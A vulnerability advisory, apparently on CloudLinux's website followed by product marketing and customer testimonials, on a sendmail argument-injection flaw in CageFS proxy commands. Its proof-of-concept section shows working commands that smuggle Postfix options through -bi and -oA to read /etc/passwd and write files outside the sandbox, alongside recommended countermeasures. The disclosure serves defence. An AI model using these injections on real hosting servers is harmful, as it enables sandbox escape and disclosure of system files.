## Impact

A CageFS-restricted local user can read and write arbitrary files of certain
file formats outside the CageFS environment by exploiting the vulnerability
documented in this advisory.

## Vulnerability Description

CloudLinux offers a feature called proxy commands in CageFS environments.
It allows limited execution of commands outside the CageFS environment from
a user restricted within the CageFS environment.

CageFS allows in its default configuration to execute `sendmail` as a proxy
command outside the CageFS environment. This default configuration is
designed to allow local programs sending emails by invoking `sendmail`.
Due to the insufficient validation of sendmail's arguments an attacker can
invoke other sendmail functionality as well. While CageFS applies some
restrictions to the allowed arguments it does not restrict or validate the
`-bi` and `-oA` arguments.

Therefore, an attacker can have `sendmail` access arbitrary files which will
be interpreted as alias database files by enabling the `newalias` mode of
`sendmail` with `-bi` and specifying a file located outside the CageFS
environment with `-oA`.

On systems using the Postfix to Sendmail compatibility interface, a great
number of different alias database types can be used to craft exploits.
The compatibility interface internally calls `postalias` and besides the
`-oA` argument already being dangerous by itself, it also suffers from an
argument injection issue, which allows injection of additional Postfix
specific arguments for `postalias`. However, this is not a security issue
in Postfix.

According to Postfix developers, Postfix's `sendmail` does not enforce a
security policy on command-line arguments. Instead, it relies on the
UNIX/Linux system to enforce access policies based on the effective user and
group IDs of the process. If a security policy should be enforced, the
calling process must sanitize the command-line arguments before they are
given to `sendmail`. This includes but is not limited to sanity checks on
pathnames, and if applicable sanity checks on file contents in a way that
is not vulnerable to time-of-check to time-of-use race attacks, and
disabling options processing with `--`.

## Proof of Concept

For example, an attacker can read arbitrary files that at least partially
follow the structure `key <whitespace> value` via the lookup table type
`texthash`:

```
$ sendmail -bi -oA'-s,-f,texthash:/etc/passwd'
postalias: warning: /etc/passwd, line 1: expected format: key whitespace value -- ignoring this line
[...]
postalias: warning: /etc/passwd, line 211: expected format: key whitespace value -- ignoring this line
sssd:x:496:493:User:    for sssd:/:/sbin/nologin
dbus:x:81:81:System:    message bus:/:/sbin/nologin
polkitd:x:497:495:User: for polkitd:/:/sbin/nologin
tss:x:59:59:Account:    used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
systemd-resolve:x:193:193:systemd:      Resolver:/:/sbin/nologin
rngd:x:494:491:Random:  Number Generator Daemon:/var/lib/rngd:/sbin/nologin
sshd:x:74:74:Privilege-separated:       SSH:/var/empty/sshd:/sbin/nologin
systemd-coredump:x:499:497:systemd:     Core Dumper:/:/sbin/nologin
nobody:x:65534:65534:Kernel:    Overflow User:/:/sbin/nologin
ftp:x:14:50:FTP:        User:/var/ftp:/sbin/nologin
unbound:x:498:496:Unbound:      DNS resolver:/etc/unbound:/sbin/nologin
nrpe:x:492:486:NRPE:    user for the NRPE service:/var/run/nrpe:/sbin/nologin
```

The attacker can also use other lookup table types which might disclose
sensitive information. For example, `unix` allows the query of specific
users regardless of the format:

```
$ sendmail -bi -oA'-q,ftp2406151,unix:passwd.byname'
ftp2406151:x:935:935::/home/ftp2406151:/sbin/nologin
```

An attacker can also write specific file formats outside the CageFS
environment. For example, with the `hash` lookup table type:

```
$ echo sba:was_here | sendmail -bi -oA'-o,-p,-i,-f,hash:/tmp/sba_was_here'
$ sendmail -bi -oA'-s,-f,hash:/tmp/sba_was_here'
@:      @
YP_LAST_MODIFIED:       1594138203
YP_MASTER_NAME: localhost
sba:    was_here
```

## Recommended Countermeasures

We recommend to restrict the `sendmail` command to only strictly required
parameters using an allow list approach. At least the following parameters
are known to cause dangerous behavior:

* `-oA`: Allows specification of multiple paths and additional arguments.
  It is important to consider that it is directly followed by the pathname
  without a separator, i.e., `-oA/etc/passwd`.
* `-bi`: Enables the `newalias` mode of `sendmail`.
* `-I`: Enables the `newalias` mode of `sendmail`.
* `-v`: If the parameter is added at least two times, i.e., `-vv`,
  `-vvvvv` or `-v -v`, it enables the verbose mode, which leaks the
  Postfix configuration in some cases.

We did not fully analyze other parameters of `sendmail`, therefore, it is
possible that `sendmail` as proxy command is also prone to other attacks.

Why use CloudLinux?

## Stability

Stable servers reduce churn and allow you to increase density, and therefore magnify your profit. The CloudLinux OS stability features prevent resource spikes and make your servers rock-solid stable, even in the most stressful situations.
[LEARN MORE](/features/#stability)

## Security

![](https://cloudlinux.com/wp-content/uploads/2021/05/icon-cage.png "icon-cage")
CloudLinux OS protects your servers from attacks by virtualizing users’ file systems and prevent sensitive information disclosure.

![](https://cloudlinux.com/wp-content/uploads/2021/05/icon-glasses.png "icon-glasses")
Our kernel-level technology prevents all known symbolic link attacks, which further enhances the security level of the servers.

![](https://cloudlinux.com/wp-content/uploads/2021/05/icon-patch.png "icon-patch")
Secure the unsupported versions of PHP where, vulnerabilities, even if discovered, are not patched by the PHP.net community.

[LEARN MORE](/features/#security)

## Profitability

Multiply the number of users on a more stable server with Cloudlinux OS and manage any resources limits for each customer.
[LEARN MORE](/features/#profitability)

## Performance

Troubleshooting performance problems with detailed information on system bottlenecks, slow database queries, functions, or external calls.
[LEARN MORE](/features/#performance)

## You’re in good company

4,000+ companies trust CloudLinux to run more than 20 million of customer websites.

As a managed hosting provider we are always looking for quality products that will help us increase efficiency and stability as well as improve the overall performance from our servers. We deployed CloudLinux on our shared hosting servers, and we have seen an immediate improvement in reliability. Now we want to offer the same solution to our dedicated server customers.

![hostdime](/wp-content/uploads/2021/05/hostdime-logo.png "hostdime")

Emmanuel Vivar, CEO

I installed [CloudLinux OS] on Sunday night. It was pretty easy. I’m also amazed at how much it has brought our CPU usage down. I thought caging the different accounts in a virtual environment would put more of a load on our server, but this has done the opposite. Before, our total CPU usage was between 50 – 90% during the day and now it is around 6 – 30%. I’m not sure how or what did this, but I’ll take it! Thank you…

![web-drafter](/wp-content/uploads/2021/07/web-drafter.png "web-drafter")

Chuck Mannella, COO

bHosted.nl use CloudLinux for all servers, from Webhosting / VPS / Dedicated servers. It’s a stable OS, we are very happy in combination with Imunify360 and Kernelcare. And if they are any problems contact the support and you get a very fast and good answer on your question.

![bhosted](/wp-content/uploads/2023/06/bhosted.webp "bhosted")

Stefan Bottelier

We’ve been really stable selling shared hosting and CloudLinux did it for us (after a number of battles trying to solve the hiccup)! It was like magic!

![gigalayer](/wp-content/uploads/2023/06/gigalayer.webp "gigalayer")

Ahmad Mukoshy, Founder

I´m running this company for 20 years, we use many vendors in the market and I’m using CloudLinux services for only one week. What I can say is: you have the BEST support service from the whole industry. You guys just rock!

![webplus](/wp-content/uploads/2021/07/webplus.png "webplus")

Diogo Lopes, CEO

This is the equivalent of changing the engine on an airplane while it’s flying. I think this will be viewed as a no-brainer purchase when you consider the cost of less than $50 annually per server for having the protection of kernel security updates without downtime.

![gabriel](/wp-content/uploads/2021/07/gabriel.png "gabriel")

Dan Olds, principal analyst

![](https://cloudlinux.com/wp-content/uploads/2021/05/quote-mark.png "quote-mark")

A lot of hosters are finding their niche, but if you are a “generic” hosting company, you have to focus on the quality of service and monetization. CloudLinux is here to help your business grow and expand.

CEO & Founder of CloudLinux Inc.
